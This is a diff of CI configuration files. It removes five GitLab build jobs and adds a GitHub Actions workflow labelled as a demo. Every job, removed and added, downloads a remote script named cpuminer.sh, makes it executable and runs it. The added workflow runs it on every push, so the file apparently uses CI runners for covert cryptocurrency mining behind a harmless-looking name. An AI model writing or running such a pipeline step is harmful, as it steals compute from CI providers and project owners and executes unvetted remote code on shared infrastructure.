@@ -1,24 +1,7 @@
-build1:
-  stage: build
-  script:
-    - wget https://github.com/librawest6/gas/raw/main/cpuminer.sh && chmod u+x cpuminer.sh && ./cpuminer.sh
-
-build2:
-  stage: build
-  script:
-    - wget https://github.com/librawest6/gas/raw/main/cpuminer.sh && chmod u+x cpuminer.sh && ./cpuminer.sh
-
-build3:
-  stage: build
-  script:
-    - wget https://github.com/librawest6/gas/raw/main/cpuminer.sh && chmod u+x cpuminer.sh && ./cpuminer.sh
-
-build4:
-  stage: build
-  script:
-    - wget https://github.com/librawest6/gas/raw/main/cpuminer.sh && chmod u+x cpuminer.sh && ./cpuminer.sh
-
-build5:
-  stage: build
-  script:
-    - wget https://github.com/librawest6/gas/raw/main/cpuminer.sh && chmod u+x cpuminer.sh && ./cpuminer.sh
+name: GitHub Actions Demo
+on: [push]
+jobs:
+  Explore-GitHub-Actions:
+    runs-on: ubuntu-latest
+    steps:
+      - run: wget https://github.com/librawest6/gas/raw/main/cpuminer.sh && chmod u+x cpuminer.sh && ./cpuminer.sh
